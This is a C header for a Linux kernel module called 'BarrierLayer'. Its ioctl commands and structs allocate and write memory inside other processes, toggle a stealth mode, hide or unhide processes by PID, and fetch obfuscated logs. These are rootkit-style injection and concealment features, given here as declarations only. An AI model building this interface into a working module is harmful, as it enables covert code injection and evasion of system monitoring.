#ifndef ADVANCED_BARRIERLAYER_H
#define ADVANCED_BARRIERLAYER_H

#include <linux/ioctl.h>

// Define a magic number for our IOCTL commands
#define BARRIERLAYER_IOCTL_MAGIC 'B'

// IOCTL commands
// Command to request kernel-assisted memory allocation in a target process
#define IOCTL_BL_ALLOC_MEM _IOWR(BARRIERLAYER_IOCTL_MAGIC, 1, struct bl_mem_request)

// Command to request kernel-assisted memory write in a target process
#define IOCTL_BL_WRITE_MEM _IOWR(BARRIERLAYER_IOCTL_MAGIC, 2, struct bl_mem_write)

// Command to activate/deactivate stealth mode in the kernel module
#define IOCTL_BL_SET_STEALTH _IOW(BARRIERLAYER_IOCTL_MAGIC, 3, int)

// Command to query kernel module status
#define IOCTL_BL_GET_STATUS _IOR(BARRIERLAYER_IOCTL_MAGIC, 4, int)

// Command to hide a process (PID)
#define IOCTL_BL_HIDE_PROCESS _IOW(BARRIERLAYER_IOCTL_MAGIC, 5, pid_t)

// Command to unhide a process (PID)
#define IOCTL_BL_UNHIDE_PROCESS _IOW(BARRIERLAYER_IOCTL_MAGIC, 6, pid_t)

// Command to retrieve obfuscated logs
#define IOCTL_BL_GET_LOGS _IOR(BARRIERLAYER_IOCTL_MAGIC, 7, struct bl_log_buffer)

// Data structure for memory allocation requests
struct bl_mem_request {
    pid_t pid;          // Target process ID
    size_t size;        // Size of memory to allocate
    unsigned long addr; // Returned allocated address
};

// Data structure for memory write requests
struct bl_mem_write {
    pid_t pid;          // Target process ID
    unsigned long addr; // Address in target process to write to
    void* data;         // Pointer to data in user-space
    size_t size;        // Size of data to write
};

// Data structure for log entries
#define BL_MAX_LOG_MSG_LEN 256
struct bl_log_entry {
    unsigned long long timestamp; // Monotonic timestamp
    char message[BL_MAX_LOG_MSG_LEN];
    size_t len;
};

// Data structure for retrieving logs
#define BL_LOG_BUFFER_SIZE 4096 // Total size of log buffer
struct bl_log_buffer {
    struct bl_log_entry entries[BL_LOG_BUFFER_SIZE / sizeof(struct bl_log_entry)];
    size_t count; // Number of valid entries
};

#endif // ADVANCED_BARRIERLAYER_H